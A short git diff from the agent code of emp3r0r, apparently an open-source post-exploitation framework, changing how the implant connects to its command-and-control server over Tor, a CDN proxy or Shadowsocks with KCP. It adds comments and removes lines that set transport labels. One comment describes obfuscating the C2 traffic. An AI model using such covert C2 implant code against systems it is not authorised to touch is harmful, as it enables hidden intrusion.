@@ -170,9 +170,10 @@ test_agent:
 
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(emp3r0r_data.CCAddress) {
+		// if CC is on Tor, CCPort won't be used since Tor handles forwarding
+		// by default we use 443, so configure your torrc accordingly
 		emp3r0r_data.CCAddress = fmt.Sprintf("%s/", emp3r0r_data.CCAddress)
 		log.Printf("CC is on TOR: %s", emp3r0r_data.CCAddress)
-		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
 		agent.RuntimeConfig.AgentProxy = *c2proxy
 		if *c2proxy == "" {
 			agent.RuntimeConfig.AgentProxy = "socks5://127.0.0.1:9050"
@@ -180,6 +181,7 @@ test_agent:
 		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, agent.RuntimeConfig.AgentProxy)
 	} else {
 		// parse C2 address
+		// append CCPort to CCAddress
 		emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, agent.RuntimeConfig.CCPort)
 	}
 	log.Printf("CCAddress is: %s", emp3r0r_data.CCAddress)
@@ -226,7 +228,6 @@ test_agent:
 				}
 			}
 		}()
-		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", agent.RuntimeConfig.CDNProxy)
 		agent.RuntimeConfig.AgentProxy = cdnproxyAddr
 	}
 
@@ -251,13 +252,6 @@ test_agent:
 					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
 					agent.RuntimeConfig.AgentProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
 						agent.RuntimeConfig.ShadowsocksPort)
-					emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s)", agent.RuntimeConfig.ShadowsocksPort)
-
-					// ss thru KCP, set C2 transport
-					if agent.RuntimeConfig.UseKCP {
-						emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s)",
-							agent.RuntimeConfig.ShadowsocksPort, agent.RuntimeConfig.KCPPort)
-					}
 
 					// run ss w/wo KCP
 					go agent.ShadowsocksC2Client()
